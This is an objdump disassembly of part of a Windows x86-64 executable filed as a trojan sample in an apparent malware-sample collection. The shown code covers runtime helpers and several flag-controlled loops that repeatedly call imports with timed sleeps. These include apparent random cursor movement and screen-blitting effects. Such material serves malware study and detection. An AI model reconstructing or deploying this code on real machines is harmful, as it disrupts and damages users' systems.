
malware_samples/trojan/be74f97ed23904632dc6f49761704a3c9bae5d6ff7707d7d7ba20ae09c342e9a.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d d5 6d 00 00 	lea    0x6dd5(%rip),%rcx        # 0x140007ddc
   140001007:	e9 60 5f 00 00       	jmp    0x140006f6c
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 05 71 c9 00 00 	lea    0xc971(%rip),%rax        # 0x14000d988
   140001017:	c3                   	ret
   140001018:	cc                   	int3
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001025:	57                   	push   %rdi
   140001026:	48 83 ec 20          	sub    $0x20,%rsp
   14000102a:	48 8b d9             	mov    %rcx,%rbx
   14000102d:	ff 15 a5 71 00 00    	call   *0x71a5(%rip)        # 0x1400081d8
   140001033:	48 8b f8             	mov    %rax,%rdi
   140001036:	ff 15 f4 71 00 00    	call   *0x71f4(%rip)        # 0x140008230
   14000103c:	4c 8b c8             	mov    %rax,%r9
   14000103f:	48 81 ff 80 96 98 00 	cmp    $0x989680,%rdi
   140001046:	75 15                	jne    0x14000105d
   140001048:	49 6b c1 64          	imul   $0x64,%r9,%rax
   14000104c:	48 89 03             	mov    %rax,(%rbx)
   14000104f:	48 8b c3             	mov    %rbx,%rax
   140001052:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001057:	48 83 c4 20          	add    $0x20,%rsp
   14000105b:	5f                   	pop    %rdi
   14000105c:	c3                   	ret
   14000105d:	48 81 ff 00 36 6e 01 	cmp    $0x16e3600,%rdi
   140001064:	75 65                	jne    0x1400010cb
   140001066:	49 ba f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r10
   14000106d:	fc f4 b2 
   140001070:	49 8b c2             	mov    %r10,%rax
   140001073:	49 f7 e9             	imul   %r9
   140001076:	49 8b c2             	mov    %r10,%rax
   140001079:	4d 8d 04 11          	lea    (%r9,%rdx,1),%r8
   14000107d:	49 c1 f8 18          	sar    $0x18,%r8
   140001081:	49 8b c8             	mov    %r8,%rcx
   140001084:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140001088:	4c 03 c1             	add    %rcx,%r8
   14000108b:	49 69 c8 00 36 6e 01 	imul   $0x16e3600,%r8,%rcx
   140001092:	4c 2b c9             	sub    %rcx,%r9
   140001095:	49 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%r9,%rcx
   14000109c:	48 f7 e9             	imul   %rcx
   14000109f:	48 03 d1             	add    %rcx,%rdx
   1400010a2:	48 c1 fa 18          	sar    $0x18,%rdx
   1400010a6:	48 8b c2             	mov    %rdx,%rax
   1400010a9:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400010ad:	48 03 d0             	add    %rax,%rdx
   1400010b0:	49 69 c0 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rax
   1400010b7:	48 03 d0             	add    %rax,%rdx
   1400010ba:	48 8b c3             	mov    %rbx,%rax
   1400010bd:	48 89 13             	mov    %rdx,(%rbx)
   1400010c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010c5:	48 83 c4 20          	add    $0x20,%rsp
   1400010c9:	5f                   	pop    %rdi
   1400010ca:	c3                   	ret
   1400010cb:	48 99                	cqto
   1400010cd:	48 f7 ff             	idiv   %rdi
   1400010d0:	48 8b c8             	mov    %rax,%rcx
   1400010d3:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400010da:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400010e1:	48 99                	cqto
   1400010e3:	48 f7 ff             	idiv   %rdi
   1400010e6:	48 03 c1             	add    %rcx,%rax
   1400010e9:	48 89 03             	mov    %rax,(%rbx)
   1400010ec:	48 8b c3             	mov    %rbx,%rax
   1400010ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010f4:	48 83 c4 20          	add    $0x20,%rsp
   1400010f8:	5f                   	pop    %rdi
   1400010f9:	c3                   	ret
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	40 53                	rex push %rbx
   140001102:	48 83 ec 20          	sub    $0x20,%rsp
   140001106:	48 8b d9             	mov    %rcx,%rbx
   140001109:	48 8b c2             	mov    %rdx,%rax
   14000110c:	48 8d 0d 45 76 00 00 	lea    0x7645(%rip),%rcx        # 0x140008758
   140001113:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001116:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000111a:	48 89 0b             	mov    %rcx,(%rbx)
   14000111d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001121:	0f 11 02             	movups %xmm0,(%rdx)
   140001124:	ff 15 de 72 00 00    	call   *0x72de(%rip)        # 0x140008408
   14000112a:	48 8b c3             	mov    %rbx,%rax
   14000112d:	48 83 c4 20          	add    $0x20,%rsp
   140001131:	5b                   	pop    %rbx
   140001132:	c3                   	ret
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001144:	48 8d 05 5d 76 00 00 	lea    0x765d(%rip),%rax        # 0x1400087a8
   14000114b:	48 85 d2             	test   %rdx,%rdx
   14000114e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001152:	c3                   	ret
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001165:	57                   	push   %rdi
   140001166:	48 83 ec 20          	sub    $0x20,%rsp
   14000116a:	48 8d 05 e7 75 00 00 	lea    0x75e7(%rip),%rax        # 0x140008758
   140001171:	48 8b f9             	mov    %rcx,%rdi
   140001174:	48 89 01             	mov    %rax,(%rcx)
   140001177:	8b da                	mov    %edx,%ebx
   140001179:	48 83 c1 08          	add    $0x8,%rcx
   14000117d:	ff 15 8d 72 00 00    	call   *0x728d(%rip)        # 0x140008410
   140001183:	f6 c3 01             	test   $0x1,%bl
   140001186:	74 0d                	je     0x140001195
   140001188:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118d:	48 8b cf             	mov    %rdi,%rcx
   140001190:	e8 0b 58 00 00       	call   0x1400069a0
   140001195:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000119a:	48 8b c7             	mov    %rdi,%rax
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	c3                   	ret
   1400011a3:	cc                   	int3
   1400011a4:	cc                   	int3
   1400011a5:	cc                   	int3
   1400011a6:	cc                   	int3
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	48 8d 05 a1 75 00 00 	lea    0x75a1(%rip),%rax        # 0x140008758
   1400011b7:	48 89 01             	mov    %rax,(%rcx)
   1400011ba:	48 83 c1 08          	add    $0x8,%rcx
   1400011be:	48 ff 25 4b 72 00 00 	rex.W jmp *0x724b(%rip)        # 0x140008410
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 8d 05 e9 75 00 00 	lea    0x75e9(%rip),%rax        # 0x1400087c0
   1400011d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011de:	00 
   1400011df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011e3:	48 8d 05 ae 75 00 00 	lea    0x75ae(%rip),%rax        # 0x140008798
   1400011ea:	48 89 01             	mov    %rax,(%rcx)
   1400011ed:	48 8b c1             	mov    %rcx,%rax
   1400011f0:	c3                   	ret
   1400011f1:	cc                   	int3
   1400011f2:	cc                   	int3
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 8d 05 d1 75 00 00 	lea    0x75d1(%rip),%rax        # 0x1400087d8
   140001207:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000120e:	00 
   14000120f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001213:	48 8d 05 ee 7e 00 00 	lea    0x7eee(%rip),%rax        # 0x140009108
   14000121a:	48 89 01             	mov    %rax,(%rcx)
   14000121d:	48 8b c1             	mov    %rcx,%rax
   140001220:	c3                   	ret
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	cc                   	int3
   140001225:	cc                   	int3
   140001226:	cc                   	int3
   140001227:	cc                   	int3
   140001228:	cc                   	int3
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 83 ec 48          	sub    $0x48,%rsp
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	e8 c2 ff ff ff       	call   0x140001200
   14000123e:	48 8d 15 73 97 00 00 	lea    0x9773(%rip),%rdx        # 0x14000a9b8
   140001245:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000124a:	e8 8d 66 00 00       	call   0x1400078dc
   14000124f:	cc                   	int3
   140001250:	40 53                	rex push %rbx
   140001252:	48 83 ec 20          	sub    $0x20,%rsp
   140001256:	48 8b d9             	mov    %rcx,%rbx
   140001259:	48 8b c2             	mov    %rdx,%rax
   14000125c:	48 8d 0d f5 74 00 00 	lea    0x74f5(%rip),%rcx        # 0x140008758
   140001263:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001266:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000126a:	48 89 0b             	mov    %rcx,(%rbx)
   14000126d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001271:	0f 11 02             	movups %xmm0,(%rdx)
   140001274:	ff 15 8e 71 00 00    	call   *0x718e(%rip)        # 0x140008408
   14000127a:	48 8d 05 87 7e 00 00 	lea    0x7e87(%rip),%rax        # 0x140009108
   140001281:	48 89 03             	mov    %rax,(%rbx)
   140001284:	48 8b c3             	mov    %rbx,%rax
   140001287:	48 83 c4 20          	add    $0x20,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	cc                   	int3
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	48 83 ec 48          	sub    $0x48,%rsp
   140001294:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001299:	e8 32 ff ff ff       	call   0x1400011d0
   14000129e:	48 8d 15 d3 97 00 00 	lea    0x97d3(%rip),%rdx        # 0x14000aa78
   1400012a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012aa:	e8 2d 66 00 00       	call   0x1400078dc
   1400012af:	cc                   	int3
   1400012b0:	40 53                	rex push %rbx
   1400012b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012b6:	48 8b d9             	mov    %rcx,%rbx
   1400012b9:	48 8b c2             	mov    %rdx,%rax
   1400012bc:	48 8d 0d 95 74 00 00 	lea    0x7495(%rip),%rcx        # 0x140008758
   1400012c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012c6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012ca:	48 89 0b             	mov    %rcx,(%rbx)
   1400012cd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012d1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012d4:	ff 15 2e 71 00 00    	call   *0x712e(%rip)        # 0x140008408
   1400012da:	48 8d 05 b7 74 00 00 	lea    0x74b7(%rip),%rax        # 0x140008798
   1400012e1:	48 89 03             	mov    %rax,(%rbx)
   1400012e4:	48 8b c3             	mov    %rbx,%rax
   1400012e7:	48 83 c4 20          	add    $0x20,%rsp
   1400012eb:	5b                   	pop    %rbx
   1400012ec:	c3                   	ret
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	48 8b d9             	mov    %rcx,%rbx
   1400012f9:	48 8b c2             	mov    %rdx,%rax
   1400012fc:	48 8d 0d 55 74 00 00 	lea    0x7455(%rip),%rcx        # 0x140008758
   140001303:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001306:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000130a:	48 89 0b             	mov    %rcx,(%rbx)
   14000130d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001311:	0f 11 02             	movups %xmm0,(%rdx)
   140001314:	ff 15 ee 70 00 00    	call   *0x70ee(%rip)        # 0x140008408
   14000131a:	48 8d 05 4f 74 00 00 	lea    0x744f(%rip),%rax        # 0x140008770
   140001321:	48 89 03             	mov    %rax,(%rbx)
   140001324:	48 8b c3             	mov    %rbx,%rax
   140001327:	48 83 c4 20          	add    $0x20,%rsp
   14000132b:	5b                   	pop    %rbx
   14000132c:	c3                   	ret
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001335:	57                   	push   %rdi
   140001336:	48 83 ec 20          	sub    $0x20,%rsp
   14000133a:	48 8b 19             	mov    (%rcx),%rbx
   14000133d:	48 8b f9             	mov    %rcx,%rdi
   140001340:	48 85 db             	test   %rbx,%rbx
   140001343:	74 4e                	je     0x140001393
   140001345:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000134a:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000134f:	83 f8 01             	cmp    $0x1,%eax
   140001352:	75 38                	jne    0x14000138c
   140001354:	48 8b 0b             	mov    (%rbx),%rcx
   140001357:	48 85 c9             	test   %rcx,%rcx
   14000135a:	74 0d                	je     0x140001369
   14000135c:	ff 15 4e 6f 00 00    	call   *0x6f4e(%rip)        # 0x1400082b0
   140001362:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140001369:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000136d:	48 85 c9             	test   %rcx,%rcx
   140001370:	74 0d                	je     0x14000137f
   140001372:	e8 29 56 00 00       	call   0x1400069a0
   140001377:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000137e:	00 
   14000137f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001384:	48 8b cb             	mov    %rbx,%rcx
   140001387:	e8 14 56 00 00       	call   0x1400069a0
   14000138c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001393:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001398:	48 83 c4 20          	add    $0x20,%rsp
   14000139c:	5f                   	pop    %rdi
   14000139d:	c3                   	ret
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	48 ff 25 f1 6e 00 00 	rex.W jmp *0x6ef1(%rip)        # 0x140008298
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013b4:	48 8d 0d 2d 74 00 00 	lea    0x742d(%rip),%rcx        # 0x1400087e8
   1400013bb:	ff 15 5f 6e 00 00    	call   *0x6e5f(%rip)        # 0x140008220
   1400013c1:	cc                   	int3
   1400013c2:	cc                   	int3
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013d4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400013d8:	48 85 c9             	test   %rcx,%rcx
   1400013db:	74 20                	je     0x1400013fd
   1400013dd:	48 8b 01             	mov    (%rcx),%rax
   1400013e0:	ff 50 10             	call   *0x10(%rax)
   1400013e3:	48 85 c0             	test   %rax,%rax
   1400013e6:	74 15                	je     0x1400013fd
   1400013e8:	48 8b 08             	mov    (%rax),%rcx
   1400013eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013f0:	4c 8b 01             	mov    (%rcx),%r8
   1400013f3:	48 8b c8             	mov    %rax,%rcx
   1400013f6:	48 83 c4 28          	add    $0x28,%rsp
   1400013fa:	49 ff e0             	rex.WB jmp *%r8
   1400013fd:	48 83 c4 28          	add    $0x28,%rsp
   140001401:	c3                   	ret
   140001402:	cc                   	int3
   140001403:	cc                   	int3
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	40 57                	rex push %rdi
   140001412:	48 83 ec 60          	sub    $0x60,%rsp
   140001416:	33 c9                	xor    %ecx,%ecx
   140001418:	ff 15 1a 6f 00 00    	call   *0x6f1a(%rip)        # 0x140008338
   14000141e:	80 3d 8f bc 00 00 00 	cmpb   $0x0,0xbc8f(%rip)        # 0x14000d0b4
   140001425:	48 8b f8             	mov    %rax,%rdi
   140001428:	0f 84 c4 00 00 00    	je     0x1400014f2
   14000142e:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140001435:	00 
   140001436:	48 89 ac 24 88 00 00 	mov    %rbp,0x88(%rsp)
   14000143d:	00 
   14000143e:	33 ed                	xor    %ebp,%ebp
   140001440:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001445:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   14000144c:	ff ff 7f 
   14000144f:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140001454:	49 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%r14
   14000145b:	ff ff 7f 
   14000145e:	66 90                	xchg   %ax,%ax
   140001460:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001465:	ff 15 f5 6e 00 00    	call   *0x6ef5(%rip)        # 0x140008360
   14000146b:	33 c9                	xor    %ecx,%ecx
   14000146d:	8b d8                	mov    %eax,%ebx
   14000146f:	ff 15 eb 6e 00 00    	call   *0x6eeb(%rip)        # 0x140008360
   140001475:	c7 44 24 40 08 00 33 	movl   $0x330008,0x40(%rsp)
   14000147c:	00 
   14000147d:	45 33 c0             	xor    %r8d,%r8d
   140001480:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   140001484:	44 8b c8             	mov    %eax,%r9d
   140001487:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   14000148b:	33 d2                	xor    %edx,%edx
   14000148d:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001492:	48 8b cf             	mov    %rdi,%rcx
   140001495:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001499:	ff 15 b1 6b 00 00    	call   *0x6bb1(%rip)        # 0x140008050
   14000149f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400014a4:	e8 77 fb ff ff       	call   0x140001020
   1400014a9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400014ae:	49 3b c6             	cmp    %r14,%rax
   1400014b1:	7d 0d                	jge    0x1400014c0
   1400014b3:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400014b9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400014be:	eb 05                	jmp    0x1400014c5
   1400014c0:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   1400014c5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400014ca:	e8 81 46 00 00       	call   0x140005b50
   1400014cf:	40 38 2d de bb 00 00 	cmp    %bpl,0xbbde(%rip)        # 0x14000d0b4
   1400014d6:	75 88                	jne    0x140001460
   1400014d8:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400014dd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400014e2:	48 8b ac 24 88 00 00 	mov    0x88(%rsp),%rbp
   1400014e9:	00 
   1400014ea:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400014f1:	00 
   1400014f2:	48 8b d7             	mov    %rdi,%rdx
   1400014f5:	33 c9                	xor    %ecx,%ecx
   1400014f7:	48 83 c4 60          	add    $0x60,%rsp
   1400014fb:	5f                   	pop    %rdi
   1400014fc:	48 ff 25 05 6e 00 00 	rex.W jmp *0x6e05(%rip)        # 0x140008308
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	40 56                	rex push %rsi
   140001512:	57                   	push   %rdi
   140001513:	48 83 ec 28          	sub    $0x28,%rsp
   140001517:	33 c9                	xor    %ecx,%ecx
   140001519:	ff 15 41 6e 00 00    	call   *0x6e41(%rip)        # 0x140008360
   14000151f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001524:	8b f8                	mov    %eax,%edi
   140001526:	ff 15 34 6e 00 00    	call   *0x6e34(%rip)        # 0x140008360
   14000152c:	80 3d 81 bb 00 00 00 	cmpb   $0x0,0xbb81(%rip)        # 0x14000d0b4
   140001533:	8b f0                	mov    %eax,%esi
   140001535:	0f 84 89 00 00 00    	je     0x1400015c4
   14000153b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001540:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001545:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000154c:	ff ff 7f 
   14000154f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001554:	49 be ff 5c 1e ee ff 	movabs $0x7fffffffee1e5cff,%r14
   14000155b:	ff ff 7f 
   14000155e:	66 90                	xchg   %ax,%ax
   140001560:	ff 15 8a 70 00 00    	call   *0x708a(%rip)        # 0x1400085f0
   140001566:	99                   	cltd
   140001567:	f7 ff                	idiv   %edi
   140001569:	8b da                	mov    %edx,%ebx
   14000156b:	ff 15 7f 70 00 00    	call   *0x707f(%rip)        # 0x1400085f0
   140001571:	99                   	cltd
   140001572:	8b cb                	mov    %ebx,%ecx
   140001574:	f7 fe                	idiv   %esi
   140001576:	ff 15 94 6d 00 00    	call   *0x6d94(%rip)        # 0x140008310
   14000157c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001581:	e8 9a fa ff ff       	call   0x140001020
   140001586:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000158b:	49 3b c6             	cmp    %r14,%rax
   14000158e:	7d 0d                	jge    0x14000159d
   140001590:	48 05 00 a3 e1 11    	add    $0x11e1a300,%rax
   140001596:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000159b:	eb 05                	jmp    0x1400015a2
   14000159d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400015a2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400015a7:	e8 a4 45 00 00       	call   0x140005b50
   1400015ac:	80 3d 01 bb 00 00 00 	cmpb   $0x0,0xbb01(%rip)        # 0x14000d0b4
   1400015b3:	75 ab                	jne    0x140001560
   1400015b5:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400015ba:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400015bf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400015c4:	48 83 c4 28          	add    $0x28,%rsp
   1400015c8:	5f                   	pop    %rdi
   1400015c9:	5e                   	pop    %rsi
   1400015ca:	c3                   	ret
   1400015cb:	cc                   	int3
   1400015cc:	cc                   	int3
   1400015cd:	cc                   	int3
   1400015ce:	cc                   	int3
   1400015cf:	cc                   	int3
   1400015d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015d4:	80 3d d9 ba 00 00 00 	cmpb   $0x0,0xbad9(%rip)        # 0x14000d0b4
   1400015db:	0f 84 94 00 00 00    	je     0x140001675
   1400015e1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400015e6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400015ed:	ff ff 7f 
   1400015f0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015f5:	48 bf ff d8 46 d6 ff 	movabs $0x7fffffffd646d8ff,%rdi
   1400015fc:	ff ff 7f 
   1400015ff:	90                   	nop
   140001600:	ff 15 ea 6f 00 00    	call   *0x6fea(%rip)        # 0x1400085f0
   140001606:	8b c8                	mov    %eax,%ecx
   140001608:	b8 f1 19 76 05       	mov    $0x57619f1,%eax
   14000160d:	f7 e9                	imul   %ecx
   14000160f:	c1 fa 05             	sar    $0x5,%edx
   140001612:	8b c2                	mov    %edx,%eax
   140001614:	c1 e8 1f             	shr    $0x1f,%eax
   140001617:	03 d0                	add    %eax,%edx
   140001619:	69 c2 dc 05 00 00    	imul   $0x5dc,%edx,%eax
   14000161f:	ba c8 00 00 00       	mov    $0xc8,%edx
   140001624:	2b c8                	sub    %eax,%ecx
   140001626:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
   14000162c:	ff 15 56 6a 00 00    	call   *0x6a56(%rip)        # 0x140008088
   140001632:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001637:	e8 e4 f9 ff ff       	call   0x140001020
   14000163c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001641:	48 3b c7             	cmp    %rdi,%rax
   140001644:	7d 0d                	jge    0x140001653
   140001646:	48 05 00 27 b9 29    	add    $0x29b92700,%rax
   14000164c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001651:	eb 05                	jmp    0x140001658
   140001653:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001658:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000165d:	e8 ee 44 00 00       	call   0x140005b50
   140001662:	80 3d 4b ba 00 00 00 	cmpb   $0x0,0xba4b(%rip)        # 0x14000d0b4
   140001669:	75 95                	jne    0x140001600
   14000166b:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001670:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001675:	48 83 c4 28          	add    $0x28,%rsp
   140001679:	c3                   	ret
   14000167a:	cc                   	int3
   14000167b:	cc                   	int3
   14000167c:	cc                   	int3
   14000167d:	cc                   	int3
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	48 83 ec 28          	sub    $0x28,%rsp
   140001684:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001689:	ff 15 89 6c 00 00    	call   *0x6c89(%rip)        # 0x140008318
   14000168f:	80 3d 1e ba 00 00 00 	cmpb   $0x0,0xba1e(%rip)        # 0x14000d0b4
   140001696:	74 61                	je     0x1400016f9
   140001698:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000169d:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400016a4:	ff ff 7f 
   1400016a7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400016ac:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400016b3:	ff ff 7f 
   1400016b6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400016bb:	e8 60 f9 ff ff       	call   0x140001020
